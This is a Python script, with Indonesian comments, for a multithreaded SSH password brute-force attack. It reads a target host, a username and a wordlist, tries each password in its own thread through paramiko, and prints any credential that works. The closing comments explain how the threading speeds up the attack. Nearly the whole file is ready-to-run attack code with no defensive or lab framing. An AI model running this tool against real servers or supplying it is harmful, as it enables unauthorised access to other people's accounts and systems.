import paramiko, sys, os, termcolor
import threading, time

stop_flag = 0

def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Menemukan Kata sandi: ' + password + ', Untuk Akun: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Login salah: ' + password), 'red'))
    ssh.close()

host = input('[+] Alamat Target: ')
username = input('[+] Nama Pengguna SSH: ')
input_file = input('[+] FIle kata sandi: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] File PAth Itu tidak ada')
    sys.exit(1)

print('* * * Memulai Threaded SSH Bruteforce On ' + host + ' Dengan Akun: ' + username + '* * *')


with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)

# ================================================================
# Dalam perbaikan skrip untuk serangan kata sandi SSH, beberapa perubahan dilakukan untuk mengimplementasikan threading:

# 1. **Variabel `stop_flag`**: Variabel global ini digunakan untuk menandai jika kata sandi yang benar telah ditemukan. Nilainya diubah menjadi 1 ketika koneksi SSH berhasil dilakukan.

# 2. **Fungsi `ssh_connect(password)`**: Fungsi ini berisi logika untuk mencoba melakukan koneksi SSH dengan kata sandi yang diberikan. Jika koneksi berhasil, variabel `stop_flag` diubah nilainya menjadi 1 dan pesan kata sandi yang ditemukan dicetak dengan warna hijau. Jika autentikasi gagal, pesan kata sandi yang tidak benar dicetak dengan warna merah.

# 3. **Iterasi Melalui Daftar Kata Sandi**:
#    - Setelah file berhasil dibuka, kode membaca setiap baris (kata sandi) dan memulai thread baru untuk mencoba koneksi SSH dengan kata sandi tersebut.
#    - Setiap thread dijalankan dengan fungsi `ssh_connect` dan password sebagai argumennya.
#    - Setiap thread diberi waktu istirahat singkat sebelum memulai thread berikutnya dengan `time.sleep(0.5)`.

# 4. **Pemeriksaan `stop_flag`**:
#    - Sebelum memulai thread baru, kode memeriksa nilai `stop_flag`. Jika sudah diubah menjadi 1, artinya kata sandi yang benar telah ditemukan, dan program keluar dari iterasi dan menunggu thread saat ini selesai sebelum keluar.

# Dengan menggunakan threading, skrip dapat mencoba beberapa kata sandi secara bersamaan, meningkatkan kecepatan serangan kata sandi. Namun, perlu diperhatikan bahwa pemakaian thread harus hati-hati untuk menghindari masalah sinkronisasi yang mungkin timbul.
